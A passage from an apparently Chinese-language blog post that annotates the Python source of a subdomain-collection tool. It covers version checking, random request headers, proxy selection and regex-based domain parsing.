headers=header, proxies=proxy,<br>                           timeout=timeout, verify=verify)<br>        <span class="hljs-comment"># 转变为json格式，并提取最晚的版本</span><br>        resp_json = resp.json()<br>        latest = resp_json[<span class="hljs-string">&#x27;tag_name&#x27;</span>]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">&#x27;An error occurred while checking the latest version&#x27;</span>)<br>        logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, e.args)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-comment"># 对获取的版本与本身的版本进行比较，并输出内容</span><br>    <span class="hljs-keyword">if</span> latest &gt; local:<br>        change = resp_json.get(<span class="hljs-string">&quot;body&quot;</span>)<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The current version is <span class="hljs-subst">&#123;local&#125;</span> &#x27;</span><br>                            <span class="hljs-string">f&#x27;but the latest version is <span class="hljs-subst">&#123;latest&#125;</span>&#x27;</span>)<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The <span class="hljs-subst">&#123;latest&#125;</span> version mainly has the following changes&#x27;</span>)<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, change)<br>    <span class="hljs-keyword">else</span>:<br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;The current version <span class="hljs-subst">&#123;local&#125;</span> is already the latest version&#x27;</span>)<br></code></pre></div></td></tr></table></figure><h4 id="5-3-1-get-random-header函数"><a href="#5-3-1-get-random-header函数" class="headerlink" title="5.3.1 get_random_header函数"></a>5.3.1 get_random_header函数</h4><p>在上一个模块中遇到的内容进一步跟进解读</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def get_random_header</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_random_header</span>():</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    等等随机的header</span><br><span class="hljs-string">    Get random header</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    headers = gen_fake_header()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(headers, <span class="hljs-built_in">dict</span>):<br>        headers = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> headers<br><span class="hljs-comment"># 进一步跟进函数gen_fake_header()</span><br><span class="hljs-comment"># def gen_fake_header</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_fake_header</span>():</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Generate fake request headers</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 首先将headers赋值为默认的header</span><br>    headers = settings.request_default_headers<br>    <span class="hljs-comment"># 判断headers是否不是dict类型</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(headers, <span class="hljs-built_in">dict</span>):<br>        headers = <span class="hljs-built_in">dict</span>()<br>    <span class="hljs-comment"># 判断是否设置了随机ua</span><br>    <span class="hljs-keyword">if</span> settings.enable_random_ua:<br>        <span class="hljs-comment"># 随机选择ua并赋值给headers</span><br>        ua = random.choice(user_agents)<br>        headers[<span class="hljs-string">&#x27;User-Agent&#x27;</span>] = ua<br>    headers[<span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>] = <span class="hljs-string">&#x27;gzip, deflate&#x27;</span><br>    <span class="hljs-keyword">return</span> headers<br></code></pre></div></td></tr></table></figure><h4 id="5-3-2-get-proxy函数"><a href="#5-3-2-get-proxy函数" class="headerlink" title="5.3.2 get_proxy函数"></a>5.3.2 get_proxy函数</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def get_proxy</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_proxy</span>():</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Get proxy</span><br><span class="hljs-string">    得到proxy</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 判断是否 需要proxy 默认不需要</span><br>    <span class="hljs-keyword">if</span> settings.enable_request_proxy:<br>        <span class="hljs-keyword">return</span> get_random_proxy()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-comment"># def get_random_proxy</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_random_proxy</span>():</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Get random proxy</span><br><span class="hljs-string">    得到随机proxy</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 获取用户自己定义的proxy_pool中的一个</span><br>        <span class="hljs-keyword">return</span> random.choice(settings.request_proxy_pool)<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></div></td></tr></table></figure><h3 id="5-4-获取并检测自身的配置参数"><a href="#5-4-获取并检测自身的配置参数" class="headerlink" title="5.4 获取并检测自身的配置参数"></a>5.4 获取并检测自身的配置参数</h3><p>即之后紧跟的self.config_param和self.check_param函数分析。该部分在之前的2，3节进行了分析</p><h3 id="5-5-get-domains函数"><a href="#5-5-get-domains函数" class="headerlink" title="5.5 get_domains函数"></a>5.5 get_domains函数</h3><p>之后应该是<del>重头戏</del>的获取域名(只是返回规范的域名)了对对应的函数进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def get_domains()</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_domains</span>(<span class="hljs-params">target, targets=<span class="hljs-literal">None</span></span>):</span><br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Getting domains&#x27;</span>)<br>    <span class="hljs-comment"># 对单个域名进行域名的正确返回</span><br>    target_domains = get_from_target(target)<br>    <span class="hljs-comment"># 对多个域名进行域名的正确返回</span><br>    targets_domains = get_from_targets(targets)<br>    <span class="hljs-comment"># 将多个内容进行整合</span><br>    domains = <span class="hljs-built_in">list</span>(target_domains.union(targets_domains))<br>    <span class="hljs-comment"># 如果存在多个域名的规范域名则按照targets进行排序</span><br>    <span class="hljs-keyword">if</span> targets_domains:<br>        domains = <span class="hljs-built_in">sorted</span>(domains, key=targets_domains.index)  <span class="hljs-comment"># 按照targets原本的index排序</span><br>    <span class="hljs-comment"># 如果没有得到规范的域名则报错</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> domains:<br>        logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;Did not get a valid domain name&#x27;</span>)<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;The obtained domains \n<span class="hljs-subst">&#123;domains&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">return</span> domains<br></code></pre></div></td></tr></table></figure><h4 id="5-5-1-get-from-target函数"><a href="#5-5-1-get-from-target函数" class="headerlink" title="5.5.1 get_from_target函数"></a>5.5.1 get_from_target函数</h4><p>进一步跟进函数了解具体如何获取单个域名的子域名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def get_from_target</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_from_target</span>(<span class="hljs-params">target</span>):</span><br>    <span class="hljs-comment"># 将domains设置为元素集</span><br>    <span class="hljs-comment"># set(): 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等</span><br>    domains = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-comment"># 基本的判断输入的target不是targets的内容</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(target, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">if</span> target.endswith(<span class="hljs-string">&#x27;.txt&#x27;</span>):<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">&#x27;Use targets parameter for multiple domain names&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># 获取正确的域名，如输入的是www.baidu.com此处返回www.baidu.com</span><br>        domain = match_main_domain(target)<br>        <span class="hljs-comment"># 如果domain不存在返回</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> domain:<br>            <span class="hljs-keyword">return</span> domains<br>        <span class="hljs-comment"># 添加内容到domains中</span><br>        domains.add(domain)<br>    <span class="hljs-keyword">return</span> domains<br></code></pre></div></td></tr></table></figure><p>此处继续跟进函数match_main_dimain</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def match_main_dimain</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">match_main_domain</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-comment"># 判断domain类型是否不是str</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(domain, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment"># 将用户输入的target进行小写处理和去除空格</span><br>    item = domain.lower().strip()<br>    <span class="hljs-comment"># 此处是作者自己的写的代码，需要进一步进行分析 代码是分析是否是域格式</span><br>    <span class="hljs-keyword">return</span> Domain(item).match()<br></code></pre></div></td></tr></table></figure><h5 id="5-5-1-1-Domain-item-match"><a href="#5-5-1-1-Domain-item-match" class="headerlink" title="5.5.1.1 Domain(item).match"></a>5.5.1.1 Domain(item).match</h5><p>对Domain.match进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># class Domain</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Domain</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    处理域类</span><br><span class="hljs-string">    Processing domain class</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str string: input string</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, string</span>):</span><br>        self.string = <span class="hljs-built_in">str</span>(string)<br>        <span class="hljs-comment"># 正则代码分析 \b匹配一个单词边界 ?=正向预查模式(在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串)(即在满足后面的情况下查找前面的内容) (xn--)(表示国际域名的格式) ?表示非贪婪模式 之后的-号不清楚意义</span><br>        self.regexp = <span class="hljs-string">r&#x27;\b((?=[a-z0-9-]&#123;1,63&#125;\.)(xn--)?[a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]&#123;2,63&#125;\b&#x27;</span><br>        self.domain = <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">match</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        match domain</span><br><span class="hljs-string">        匹配域</span><br><span class="hljs-string">        :return : result</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 返回具体的域名</span><br>        result = re.search(self.regexp, self.string, re.I)<br>        <span class="hljs-keyword">if</span> result:<br>            <span class="hljs-keyword">return</span> result.group()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></div></td></tr></table></figure><h4 id="5-5-2-get-from-targets函数"><a href="#5-5-2-get-from-targets函数" class="headerlink" title="5.5.2 get_from_targets函数"></a>5.5.2 get_from_targets函数</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def get_from_targets</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_from_targets</span>(<span class="hljs-params">targets</span>):</span><br>    domains = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(targets, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> domains<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 获取文件的名称</span><br>        path = Path(targets)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>        <span class="hljs-keyword">return</span> domains<br>    <span class="hljs-comment"># 判断文件是否存在，且是否是文件</span><br>    <span class="hljs-keyword">if</span> path.exists() <span class="hljs-keyword">and</span> path.is_file():<br>        <span class="hljs-comment"># 读取文件内容 相关函数较为简单之后跟进</span><br>        domains = read_target_file(targets)<br>        <span class="hljs-keyword">return</span> domains<br>    <span class="hljs-keyword">return</span> domains<br><br><span class="hljs-comment"># read_target_file</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_target_file</span>(<span class="hljs-params">target</span>):</span><br>    domains = <span class="hljs-built_in">list</span>()<br>    <span class="hljs-comment"># 打开文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(target, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-comment"># 逐行读取存储</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            <span class="hljs-comment"># 判断是否符合域名规则并返回标准域名格式</span><br>            domain = match_main_domain(line)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> domain:<br>                <span class="hljs-keyword">continue</span><br>            domains.append(domain)<br>    <span class="hljs-comment"># 对域名进行排序后返回内容</span><br>    sorted_domains = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(domains), key=domains.index)<br>    <span class="hljs-keyword">return</span> sorted_domains<br><br><span class="hljs-comment"># match_main_domain</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">match_main_domain</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(domain, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    item = domain.lower().strip()<br>    <span class="hljs-keyword">return</span> Domain(item).match()<br></code></pre></div></td></tr></table></figure><h3 id="5-6-get-main-domain函数"><a href="#5-6-get-main-domain函数" class="headerlink" title="5.6 get_main_domain函数"></a>5.6 get_main_domain函数</h3><p>之后的代码较为简单，这里写上但是重点分析get_main_domain函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># run</span><br><span class="hljs-comment"># 需要进行搜索的域名个数</span><br>count = <span class="hljs-built_in">len</span>(self.domains)<br>logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Got <span class="hljs-subst">&#123;count&#125;</span> domains&#x27;</span>)<br><span class="hljs-comment"># 当域名个数为零时结束函数</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> count:<br>    logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">&#x27;Failed to obtain domain&#x27;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 对需要搜索的域名进行子域名搜索</span><br><span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> self.domains:<br>    <span class="hljs-comment"># 先跟进函数后解释 </span><br>    self.domain = utils.get_main_domain(domain)<br>    <span class="hljs-comment"># 切换到main函数</span><br>    self.main()<br><span class="hljs-comment"># def get_main_domain</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_main_domain</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-comment"># 判断域名是否是字符串</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(domain, <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment"># 之后进一步跟进函数</span><br>    <span class="hljs-keyword">return</span> Domain(domain).registered()<br></code></pre></div></td></tr></table></figure><p>对于Domain(domain).registered进行分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def registered</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">registered</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    注册域</span><br><span class="hljs-string">    registered domain</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; d = Domain(&#x27;www.example.com&#x27;)</span><br><span class="hljs-string">    &lt;domain.Domain object&gt;</span><br><span class="hljs-string">    &gt;&gt;&gt; d.registered()</span><br><span class="hljs-string">    example.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :return: registered domain result</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 进一步分析 extract函数</span><br>    result = self.extract()<br>    <span class="hljs-keyword">if</span> result:<br>        <span class="hljs-keyword">return</span> result.registered_domain<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># def extract</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    提取域</span><br><span class="hljs-string">    extract domain</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; d = Domain(&#x27;www.example.com&#x27;)</span><br><span class="hljs-string">    &lt;domain.Domain object&gt;</span><br><span class="hljs-string">    &gt;&gt;&gt; d.extract()</span><br><span class="hljs-string">    ExtractResult(subdomain=&#x27;www&#x27;, domain=&#x27;example&#x27;, suffix=&#x27;com&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :return: extracted domain results</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 设置路径</span><br>    data_storage_dir = settings.data_storage_dir<br>    <span class="hljs-comment"># 选择data目录下的public_suffix_list.dat表</span><br>    extract_cache_file = data_storage_dir.joinpath(<span class="hljs-string">&#x27;public_suffix_list.dat&#x27;</span>)<br>    <span class="hljs-comment"># 跟进分析 此处只是调用了__init__部分将可能存在的~转变为正常路径</span><br>    ext = tldextract.TLDExtract(extract_cache_file)<br>    <span class="hljs-comment"># 跟进分析 正则匹配后将输出有效的域名</span><br>    result = self.match()<br>    <span class="hljs-keyword">if</span> result:<br>        <span class="hljs-comment"># 跟进分析 </span><br>        <span class="hljs-keyword">return</span> ext(result)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># class TLDExtract</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TLDExtract</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    A callable for extracting, subdomain, domain, and suffix components from a URL.</span><br><span class="hljs-string">    用于从URL提取、子域、域和后缀组件的可调用函数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, cache_file=<span class="hljs-literal">None</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Constructs a callable for extracting subdomain, domain, and suffix</span><br><span class="hljs-string">        components from a URL.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># os.path.expanduser将传入路径为~替换为详细的路径如~/tmp为/home/user/tmp(windows中为 c:\Users\user\tmp)</span><br>        self.cache_file = os.path.expanduser(cache_file <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>)<br>        self._extractor = <span class="hljs-literal">None</span><br>    <span class="hljs-comment"># __call__实际上是将一个类重载了&quot;()&quot;，也就是让一个类也可以像一个函数一样可以拿来调用了,在此处下一个ext(result)调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__call__</span>(<span class="hljs-params">self, url</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Takes a string URL and splits it into its subdomain, domain, and</span><br><span class="hljs-string">        suffix (effective TLD, gTLD, ccTLD, etc.) component.</span><br><span class="hljs-string">        获取字符串URL并将其拆分为子域、域和后缀（有效TLD、gTLD、ccTLD等）组件。</span><br><span class="hljs-string">        &gt;&gt;&gt; ext = TLDExtract()</span><br><span class="hljs-string">        &gt;&gt;&gt; ext(&#x27;http://forums.news.cnn.com/&#x27;)</span><br><span class="hljs-string">        ExtractResult(subdomain=&#x27;forums.news&#x27;, 